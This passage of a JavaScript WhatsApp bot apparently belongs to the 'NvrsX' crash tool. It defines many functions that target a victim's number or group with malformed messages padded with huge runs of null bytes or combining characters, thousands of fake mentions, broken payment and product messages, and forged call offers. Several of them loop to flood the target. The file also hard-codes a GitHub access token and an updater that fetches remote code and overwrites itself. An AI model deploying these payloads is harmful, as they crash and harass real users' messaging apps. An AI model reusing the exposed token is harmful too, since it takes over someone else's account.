            paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(100000)}\",\"flow_message_version\":\"3\"}`,
            version: 3
          }
        }
      },
      {}
    );
    await client.relayMessage(isTarget, { groupStatusMessageV2: { message: msg.message } }, {
    participant: { jid: isTarget }
  });
}

async function nyetrumAnying(isTarget) {
  try {
    const jid = String(isTarget).includes("@s.whatsapp.net")
      ? String(isTarget)
      : `${String(isTarget).replace(/\D/g, "")}@s.whatsapp.net`;

    const mutexMemek = () => {
      let map = {};
      return {
        mutex(key, fn) {
          map[key] ??= { task: Promise.resolve() };
          map[key].task = (async (prev) => {
            try {
              await prev;
            } catch {}
            return fn();
          })(map[key].task);
          return map[key].task;
        }
      };
    };

    const MamakLoJing = mutexMemek();

    const xrellyBuffer = (buf) =>
      Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);

    const yntkts = encodeSignedDeviceIdentity;

    client.createParticipantNodes = async (
      recipientJids,
      message,
      extraAttrs,
      dsmMessage
    ) => {
      if (!recipientJids.length) {
        return { nodes: [], shouldIncludeDeviceIdentity: false };
      }

      const patched =
        (await client.patchMessageBeforeSending?.(
          message,
          recipientJids
        )) ?? message;

      const ywdh = Array.isArray(patched)
        ? patched
        : recipientJids.map((j) => ({
            recipientJid: j,
            message: patched
          }));

      const { id: meId, lid: meLid } = client.authState.creds.me;
      const jembut = meLid ? jidDecode(meLid)?.user : null;

      let shouldIncludeDeviceIdentity = false;

      const nodes = await Promise.all(
        ywdh.map(async ({ recipientJid: j, message: msg }) => {
          const { user: isTargetUser } = jidDecode(j);
          const { user: ownUser } = jidDecode(meId);

          const isOwn =
            isTargetUser === ownUser || isTargetUser === jembut;

          const y = j === meId || j === meLid;
          if (dsmMessage && isOwn && !y) msg = dsmMessage;

          const bytes = xrellyBuffer(
            yntkts ? yntkts(msg) : Buffer.from([])
          );

          return MamakLoJing.mutex(j, async () => {
            const { type, ciphertext } =
              await client.signalRepository.encryptMessage({
                jid: j,
                data: bytes
              });

            if (type === "pkmsg") {
              shouldIncludeDeviceIdentity = true;
            }

            return {
              tag: "to",
              attrs: { jid: j },
              content: [
                {
                  tag: "enc",
                  attrs: { v: "2", type, ...extraAttrs },
                  content: ciphertext
                }
              ]
            };
          });
        })
      );

      return {
        nodes: nodes.filter(Boolean),
        shouldIncludeDeviceIdentity
      };
    };

    let devices = [];

    try {
      devices = (
        await client.getUSyncDevices([jid], false, false)
      ).map(({ user, device }) =>
        `${user}${device ? ":" + device : ""}@s.whatsapp.net`
      );
    } catch {
      devices = [jid];
    }

    try {
      await client.assertSessions(devices);
    } catch {}

    let destinations = [];
    let shouldIncludeDeviceIdentity = false;

    try {
      const created = await client.createParticipantNodes(
        devices,
        { conversation: "y" },
        { count: "0" }
      );

      destinations = created?.nodes ?? [];
      shouldIncludeDeviceIdentity =
        !!created?.shouldIncludeDeviceIdentity;
    } catch {}

    const wtfXrL = {
      tag: "call",
      attrs: {
        to: jid,
        id:
          client.generateMessageTag?.() ??
          crypto.randomBytes(8).toString("hex"),
        from:
          client.user?.id ||
          client.authState?.creds?.me?.id
      },
      content: [
        {
          tag: "offer",
          attrs: {
            "call-id": crypto
              .randomBytes(16)
              .toString("hex")
              .slice(0, 64)
              .toUpperCase(),
            "call-creator":
              client.user?.id ||
              client.authState?.creds?.me?.id
          },
          content: [
            { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
            { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
            {
              tag: "video",
              attrs: {
                orientation: "0",
                screen_width: "1920",
                screen_height: "1080",
                device_orientation: "0",
                enc: "vp8",
                dec: "vp8"
              }
            },
            { tag: "net", attrs: { medium: "3" } },
            {
              tag: "capability",
              attrs: { ver: "1" },
              content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
            },
            { tag: "encopt", attrs: { keygen: "2" } },
            {
              tag: "destination",
              attrs: {},
              content: destinations
            }
          ]
        }
      ]
    };

    if (shouldIncludeDeviceIdentity && encodeSignedDeviceIdentity) {
      try {
        const deviceIdentity = encodeSignedDeviceIdentity(
          client.authState.creds.account,
          true
        );

        wtfXrL.content[0].content.push({
          tag: "device-identity",
          attrs: {},
          content: deviceIdentity
        });
      } catch {}
    }

    await client.relayMessage(
      isTarget,
      {
        requestPaymentMessage: {
          currencyCodeIso4217: "USD",
          requestFrom: isTarget,
          expiryTimestamp: null,
          contextInfo: {
            remoteJid: " X ",
            isForwarded: true,
            forwardingScore: 9999,
            externalAdReply: {
              title: "Travas NvrsX",
              body: "High NvrsX Valcoon",
              mediaType: "VIDEO",
              renderLargerThumbnail: true,
              previewTtpe: "VIDEO",
              sourceUrl: "https://t.me/Aurelxa",
              mediaUrl: "https://t.me/NvrsxTeams",
              showAdAttribution: true
            }
          }
        }
      },
      {
        participant: { jid: isTarget },
        quoted: null,
        useraJid: null,
        messageId: null
      }
    );

    await client.sendNode(wtfXrL);
  } catch {}
}

async function xtd(isTarget) {
    try {
        for (let i = 0; i < 55; i++) {
            await client.relayMessage(isTarget, {
                extendedTextMessage: {
                    text: "Hard NvrsX" + "ꦽ".repeat(90000),
                    contextInfo: {
                        stanzaId: isTarget,
                        participant: isTarget,
                        quotedMessage: {
                            conversation: "Aurelxa"
                        }
                    }
                }
            }, {
                messageId: client.generateMessageTag(),
                participant: { jid: isTarget }
            });
        }
    } catch (e) {
        console.error("kontoll error:", e.message);
    }
}
async function DocPay(isTarget, ptcp = false) {
    const msg = {
        interactiveMessage: {
            title: '🩸⃟⃨〫⃰‣ ⁖Nvrsx Trasher ‣—' + "ꦾ".repeat(50000),
            nativeFlowMessage: {
                buttons: [
                    {
                        name: 'review_and_pay',
                        buttonParamsJson: "{\"currency\":\"XOF\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":999999999,\"offset\":100},\"reference_id\":\"NVRSX TRASH\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"descripiton\":\"\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-69d62566-4850-469a-b192-a6fd9f58cc14\",\"name\":null,\"amount\":{\"value\":999999999,\"offset\":100},\"quantity\":1}]},\"additional_note\":null,\"native_payment_methods\":[],\"share_payment_status\":false}"
                    }
                ]
            },
            contextInfo: {
                mentionedJid: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                ),
                remoteJid: "status@broadcast",
                participant: "0@s.whatsapp.net",
                fromMe: true,
                isForwarded: true,
                forwardingScore: 9999,
                quotedMessage: {
                    interactiveResponseMessage: {
                        body: {
                            text: "NvrsX Null",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: 'galaxy_message',
                            paramsJson: "\u0000".repeat(500000),
                            version: 3
                        }
                    }
                }
            }
        }
    };
    
    await client.sendMessage(isTarget, msg, 
        ptcp ? { participant: { jid: isTarget } } : {});
}
async function CrashPair(client, isTarget) {
  for (let r = 0; r < 10; r++) {
  await client.requestPairingCode(isTarget, "NVRSX123");
  }
}
async function callSfx(isTarget, isVideo = false) {
const devices = (await client.getUSyncDevices([isTarget], false, false)).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);
await client.assertSessions(devices);

const xnxx = () => {
const map = {};
return {
mutex(key, fn) {
map[key] ??= { task: Promise.resolve() };
map[key].task = (async prev => { try { await prev; } catch {} return fn(); })(map[key].task);
return map[key].task;
}
};
};

const memek = xnxx();
const bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
const porno = client.createParticipantNodes.bind(client);
const yntkts = client.encodeWAMessage?.bind(client);

client.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };
const patched = await (client.patchMessageBeforeSending?.(message, recipientJids) ?? message);
const ywdh = Array.isArray(patched) ? patched : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

const { id: meId, lid: meLid } = client.authState.creds.me;
const omak = meLid ? jidDecode(meLid)?.user : null;
let shouldIncludeDeviceIdentity = false;

const nodes = await Promise.all(ywdh.map(async ({ recipientJid: jid, message: msg }) => {
const { user: isTargetUser } = jidDecode(jid);
const { user: ownPnUser } = jidDecode(meId);
const isOwnUser = isTargetUser === ownPnUser || isTargetUser === omak;
const y = jid === meId || jid === meLid;
if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

const bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));
return memek.mutex(jid, async () => {
const { type, ciphertext } = await client.signalRepository.encryptMessage({ jid, data: bytes });
if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
return { tag: 'to', attrs: { jid }, content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }] };
});
}));

return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
};

const awik = crypto.randomBytes(32);
const awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);
const { nodes: destinations, shouldIncludeDeviceIdentity } = await client.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });

const offerContent = [
{ tag: "audio", attrs: { enc: "opus", rate: "16000" } },
{ tag: "audio", attrs: { enc: "opus", rate: "8000" } },
{ tag: "net", attrs: { medium: "3" } },
{ tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
{ tag: "encopt", attrs: { keygen: "2" } },
{ tag: "destination", attrs: {}, content: destinations },
...(shouldIncludeDeviceIdentity ? [{ tag: "device-identity", attrs: {}, content: encodeSignedDeviceIdentity(client.authState.creds.account, true) }] : [])
];

if (isVideo) offerContent.splice(2, 0, { tag: "video", attrs: { orientation: "0", screen_width: "99999", screen_height: "99999", device_orientation: "0", enc: "vp8", dec: "vp8" } });

const lemiting = {
tag: "call",
attrs: { to: isTarget, id: client.generateMessageTag(), from: client.user.id },
content: [{ tag: "offer", attrs: { "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(), "call-creator": client.user.id }, content: offerContent }]
};

await client.sendNode(lemiting);
}
async function CrashSafe(isTarget) {
  var R9X = {
     requestPaymentMessage: {
        sendPaymentMessage: {
      }
    }
  };
  await client.relayMessage(isTarget, R9X, {
  });
}
async function FlightOne(isTarget) {
    let message = {
      requestPaymentMessage: {
      currencyCodeIso4217: 'IDR',
      requestFrom: target, 
      expiryTimestamp: null,
      requestPaymentMessage: {
      contextInfo: {
        forwardingScore: 9999,
        isForwarded: false,
        body: { text: "NvrsX Valcoon" },
        nativeFlowMessage: {
          buttons: [
            {
              name: "payment_method",
              buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0010".repeat(
                0x2710
              )},\"payment_timestamp\":null,\"share_payment_status\":true}`,
            },
          ],
          messageParamsJson: "{}",
         },
         deviceListMetadata: {},
         deviceListMetadataVersion: 2,
         disappearingMode: {
           initiator: "INITIATED_BY_ME"
        },
        nativeFlowMessage: {
        buttons: [
          {
            name: "call_permission_request",
            buttonParamsJson: JSON.stringify({
              text: "CALL",
              id: "call_permission_request"
            })
          }
        ]
      }
     },
     participant: { jid: isTarget }
     }
    }
  };

  await client.relayMessage(isTarget, message, {
    participant: { jid: isTarget },
    messageId: null,
    userJid: target,
    quoted: null
  })
}

async function R9XLow(client, isTarget, mention = true) {
  for (let r = 0; r < 75; r++) {
    var R9X = generateWAMessageFromContent(isTarget, {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length: 2000 }, (_, r) => `6285983729${r + 1}@s.whatsapp.net`)
        },
        body: {
          text: "NvrsX - Valcoon | ExL¡ps0r",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
          version: 3
        }
      }
    }, {});
    
    await client.relayMessage(
      isTarget,
      {
        groupStatusMessageV2: {
          message: R9X.message
        }
      },
      mention
        ? { messageId: R9X.key.id, participant: { jid: isTarget } }
        : { messageId: R9X.key.id }
    );
  }
    console.log(chalk.red(`Succes Sending Bug By NvrsX To ${isTarget}`));
}

async function CombCrash(client, isTarget) {
  var R9X = {
     sendPaymentMessage: {
    }
  };
  await client.relayMessage(isTarget, R9X, {
  });

  var R9X2 = {
    requestPaymentMessage: {
    }
  };
  await client.relayMessage(isTarget, R9X2, {
  });
}

async function CrashDell(client, isTarget) {
  const R9X = await client.sendMessage(isTarget, {
    requestPaymentMessage: {
      sendPaymentMessage: {}
    }
  });

  await client.sendMessage(isTarget, {
    delete: {
      remoteJid: isTarget,
      fromMe: true,
      id: R9X.key.id
    }
  });
}

async function ZhTExp3riment(client, isTarget) {
  const R9X = generateWAMessageFromContent(
    isTarget,
    {
      productMessage: {
        product: {
          productImage: {
            url: "https://mmg.whatsapp.net/o1/v/t24/f2/m232/AQNVJiaPtq4Sbf8CxOoOzzjG0MhQfcEYp5a3RFKcWBSVcbpL-t5yDfR0nH5aJAUinpDS6rCsfN--747mOTiF-oaiO97W41SndL8DiveF6w?ccb=9-4&oh=01_Q5Aa3AE1L5Iz4vV7dLKJBsOGPtCrs08G_-y0L0rO6KMSMEj4rg&oe=694A1259&_nc_sid=e6ed6c&mms3=true",
            mimetype: "image/jpeg",
            fileSha256: "DqRi9X3lEDH7WJSqb6E1njeawZZkIg8DTHZgdIga+E8=",
            fileLength: "72103",
            mediaKey: "Mt4oRen73PaURrUvv9vLJTPNBQoUlbNNtVr4D7FziAw=",
            fileEncSha256: "okpg3oYPwe/ndLcMdIPy0gtyYl/wvC9WurHeekXWTOk=",
            directPath: "/o1/v/t24/f2/m232/AQNVJiaPtq4Sbf8CxOoOzzjG0MhQfcEYp5a3RFKcWBSVcbpL-t5yDfR0nH5aJAUinpDS6rCsfN--747mOTiF-oaiO97W41SndL8DiveF6w?ccb=9-4&oh=01_Q5Aa3AE1L5Iz4vV7dLKJBsOGPtCrs08G_-y0L0rO6KMSMEj4rg&oe=694A1259&_nc_sid=e6ed6c",
            mediaKeyTimestamp: "1763881206",
            width: -99999999999999999999,
            height: 1,
            jpegThumbnail: null,
            productId: "9783476898425051",
            title: "NVRSX",
            description: "404",
            currencyCode: "IDR",
            priceAmount1000: "X",
            retailerId: "BAN011",
            productImageCount: 2,
            salePriceAmount1000: "50000000"
          }
        },
        businessOwnerJid: isTarget
      }
    },
    {}
  );

  await client.relayMessage(isTarget, R9X.message, {
    participant: { jid: isTarget }
  });
}

async function GsNull(client, isTarget, mention = true) {
  for (let i = 0; i < 1; i++) {
    const R9X = {
      interactiveResponseMessage: {
        body: {
          text: "NVRSX 3XECUTE",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "single_select",
          paramsJson: "\r"
        }
      }
    };

    const R9X2 = generateWAMessageFromContent(
      isTarget,
      {
        groupStatusMessageV2: {
          message: R9X
        }
      },
      {}
    );

    await client.relayMessage(
      isTarget,
      R9X2.message,
      mention
        ? {
            messageId: R9X2.key.id,
            participant: { jid: isTarget }
          }
        : {
            messageId: R9X2.key.id
          }
    );

    await client.relayMessage(
      isTarget,
      {
        sendPaymentMessage: {}
      },
      {
        participant: { jid: isTarget }
      }
    );
  }
}

async function blankIos(isTarget) {
  await client.sendMessage(
    isTarget,
    {
      text: "👁‍🗨⃟꙰。⃝ᐧ̤𝐓͜𝐑𝐀͓᪳𝐒⃪𝐇 🍷 𝐍͢𝐕͢𝐑͢𝐒͢𝐗.ꪸ⃟‼️ ✩",
      contentText: "👁‍🗨⃟꙰。⃝ᐧ̤𝐓͜𝐑𝐀͓᪳𝐒⃪𝐇 🍷 𝐍͢𝐕͢𝐑͢𝐒͢𝐗.ꪸ⃟‼️ ✩",
      footer: "# - NvrsX ~ 3xecute",
      viewOnce: true,
      buttons: [
        {
          buttonId: "🦠",
          buttonText: {
            displayText: "🦠"
          },
          type: 4,
          nativeFlowInfo: {
            name: "single_select",
            paramsJson: JSON.stringify({
              title: `{"᬴".repeat(60000)}`,
              sections: [
                {
                  title: "",
                  highlight_label: "label",
                  rows: []
                }
              ]
            })
          }
        }
      ],
      headerType: 1
    },
    {
      ephemeralExpiration: 5,
      timeStamp: Date.now()
    }
  );
}

async function FastKill(client, isTarget) {
  await client.sendMessage(isTarget, {
    image: { url: "https://g.top4top.io/p_3641dzosc0.jpg" },
    caption: "NVRSX",
    width: 1,
    height: 99999999999999
  });
}

async function K4RKillGc(client, isTarget, mention = false) {
  await client.relayMessage(
    isTarget,
    {
      interactiveMessage: {
        nativeFlowMessage: {
          buttons: [
            {
              name: "payment_info",
              buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"4TWOZ803CWN\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"payment_key\",\"payment_key\":{\"type\":\"IDPAYMENTACCOUNT\",\"key\":\"+628123456789101\",\"name\":\"OVO\",\"institution_name\":\"OVO\",\"full_name_on_account\":\"R9X \",\"account_type\":\"wallet\"}}],\"share_payment_status\":false,\"referral\":\"chat_attachment\"}"
            }
          ]
        }
      }
    },
    mention
      ? {
          participant: { jid: isTarget }
        }
      : {}
  );
}

async function KillGc(client, isTarget, mention = false) {
  await client.relayMessage(
    isTarget,
    {
      requestPaymentMessage: {
      currencyCodeIso4217: null,
      requestFrom: "13135550202@s.whatsapp.net", 
      expiryTimestamp: Date.now() + 8000, 
      amount: {
        value: null, 
        offset: null, 
        currencyCode: null
       }
     }
    },
    mention
      ? {
          participant: { jid: isTarget }
        }
      : {}
   )
}

async function joinGroup(groupLink) {
    if (!groupLink) throw new Error("Masukkan Link Group!");
    if (!groupLink.includes('https://chat.whatsapp.com/')) throw new Error("Link Invalid!");
    
    const inviteCode = groupLink.split('https://chat.whatsapp.com/')[1];
    
    try {
        const result = await client.groupAcceptInvite(inviteCode);
        return result;
    } catch (error) {
        const ignoredErrors = [409, 410, 'already', 'gone'];
        const shouldIgnore = ignoredErrors.some(err => 
            error.data === err || error.message?.toLowerCase().includes(err)
        );
        
        if (shouldIgnore) {
            console.log(`⚠️ ${error.message} - Continuing anyway...`);
            try {
                const metadata = await client.groupGetInviteInfo(inviteCode);
                return metadata.id;
            } catch {
                return `${inviteCode}@g.us`;
            }
        }
        
        throw error;
    }
}
//=================================================//
module.exports = {
    initializeWhatsAppConnections,
    connectToWhatsApp,
    makeStatus,
    makeCode,
    sessions,
    client,
    nyetrumAnying,
    oneMsg,
    TrashLocIOS,
    callSfx,
    GsNull,
    KillGc,
    FastKill,
    crashGP,
    location,
    sjlglx,
    xtd,
    FlightOne,
    gsgalaxy,
    joinGroup,
    R9XLow,
    CrashDell,
    CombCrash,
    ZhTExp3riment,
    CrashSafe,
    CrashPair,
    blankIos,
    getRemoteFunction,
    GITHUB_DATABASE,
    file_session
    };
   

// --- AUTO UPDATE 
// ================= KONFIGURASI GITHUB =================
const GITHUB_AUTH = {
    token: "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", // GANTI DENGAN TOKEN GITHUB KAMU
    owner: "Luxxy-appocalype",
    repo: "dirisaya",
    branch: "main"
};

const GITHUB_INDEX_URL = "https://raw.githubusercontent.com/Luxxy-appocalype/dirisaya/refs/heads/main/index.js"; 
const GITHUB_CASE_URL = "https://raw.githubusercontent.com/Luxxy-appocalype/dirisaya/refs/heads/main/nvrsx-case.js";

// ================= SISTEM DYNAMIC SECRET =================
const MASTER_KEY = "NVRS_NEWS"; 

if (!fs.existsSync('./secret.json')) {
    fs.writeFileSync('./secret.json', JSON.stringify({ active_key: "KUNCI_AWAL" }));
}

const getStoredKey = () => JSON.parse(fs.readFileSync('./secret.json')).active_key;

// ================= GLOBAL FUNCTIONS =================
global.manageSecret = async (action, newKey, master) => {
    if (master !== MASTER_KEY) return { success: false, msg: "❌ Master Key Salah!" };
    if (action === 'create') {
        fs.writeFileSync('./secret.json', JSON.stringify({ active_key: newKey }));
        return { success: true, msg: `✅ Secret Key baru: *${newKey}*` };
    }
    if (action === 'delete') {
        fs.writeFileSync('./secret.json', JSON.stringify({ active_key: "" }));
        return { success: true, msg: "✅ Secret Key dihapus!" };
    }
    if (action === 'check') {
        return { success: true, msg: `🔑 Secret Key aktif: *${getStoredKey() || "KOSONG"}*` };
    }
};

global.githubPush = async (fileName, content, commitMsg = "Update via Bot") => {
    try {
        const url = `https://api.github.com/repos/${GITHUB_AUTH.owner}/${GITHUB_AUTH.repo}/contents/${fileName}`;
        let sha = null;
        try {
            const check = await axios.get(url, { headers: { Authorization: `token ${GITHUB_AUTH.token}` } });
            sha = check.data.sha;
        } catch (e) {}
        await axios.put(url, {
            message: commitMsg,
            content: Buffer.from(content).toString('base64'),
            sha: sha,
            branch: GITHUB_AUTH.branch
        }, { headers: { Authorization: `token ${GITHUB_AUTH.token}` } });
        return { success: true, msg: `✅ File "${fileName}" berhasil di-push!` };
    } catch (e) {
        return { success: false, msg: `❌ Gagal push: ${e.response?.data?.message || e.message}` };
    }
};

global.githubDelete = async (fileName) => {
    try {
        const url = `https://api.github.com/repos/${GITHUB_AUTH.owner}/${GITHUB_AUTH.repo}/contents/${fileName}`;
        const check = await axios.get(url, { headers: { Authorization: `token ${GITHUB_AUTH.token}` } });
        await axios.delete(url, {
            headers: { Authorization: `token ${GITHUB_AUTH.token}` },
            data: { message: "Delete via Bot", sha: check.data.sha, branch: GITHUB_AUTH.branch }
        });
        return { success: true, msg: `✅ File "${fileName}" berhasil dihapus!` };
    } catch (e) {
        return { success: false, msg: `❌ Gagal hapus: ${e.response?.data?.message || e.message}` };
    }
};

// ================= LOGIKA INTERAKTIF UPDATE =================
const askQuestion = (query) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise(resolve => {
        const timeout = setTimeout(() => {
            rl.close();
            resolve(null); 
        }, 5000); 
        rl.question(query, (ans) => {
            clearTimeout(timeout);
            rl.close();
            resolve(ans);
        });
    });
};

const runUpdateLogic = async () => {
    console.log(chalk.bold.yellow("\n--- OPSI PEMBARUAN ---"));
    console.log("1. Update (Cek GitHub)");
    console.log("2. Bypass (Tanpa Update)");
    
    let choice = await askQuestion(chalk.cyan("Pilih (1/2) atau tunggu 5 detik: "));
    
    if (!choice) {
        console.log(chalk.magenta("🕒 Timeout, menggunakan setting Panel (AUTO_UPDATE)..."));
        choice = process.env.AUTO_UPDATE === 'true' ? '1' : '2';
    }

    if (choice === '1') {
        const inputSecret = process.env.SECRET_KEY || "";
        const storedKey = getStoredKey();

        if (inputSecret !== storedKey) {
            console.log(chalk.red("❌ Kunci Secret Panel SALAH. Update dibatalkan."));
            return;
        }

        try {
            console.log(chalk.cyan("🚀 Mendownload pembaruan..."));
            let isUpdated = false;

            const resIndex = await axios.get(`${GITHUB_INDEX_URL}?t=${Date.now()}`);
            if (resIndex.data !== fs.readFileSync(__filename, 'utf8')) {
                fs.writeFileSync(__filename, resIndex.data, 'utf8');
                isUpdated = true;
            }

            const resCase = await axios.get(`${GITHUB_CASE_URL}?t=${Date.now()}`);
            if (!fs.existsSync("./nvrsx-case.js") || resCase.data !== fs.readFileSync("./nvrsx-case.js", 'utf8')) {
                fs.writeFileSync("./nvrsx-case.js", resCase.data, 'utf8');
                isUpdated = true;
            }

            if (isUpdated) {
                console.log(chalk.green("✅ File diperbarui! Restarting..."));
                process.exit(0);
            } else {
                console.log(chalk.blue("✅ Sudah versi terbaru."));
            }
        } catch (e) {
            console.log(chalk.red("❌ Gagal Update: " + e.message));
        }
    } else {
        console.log(chalk.yellow("⚠️ Menjalankan mode Bypass."));
    }
};

// ================= START BOT =================
(async () => {
    console.clear();
    console.log(chalk.bold.cyan(`🚀 NVRSX System | Host: [${hostname}]`));
    
    await runUpdateLogic();

    // MASUKKAN LOGIKA KONEKSI WA/TELEGRAM KAMU DI SINI
    console.log(chalk.bold.green(`\n[ SYSTEM ONLINE ]`));
})();
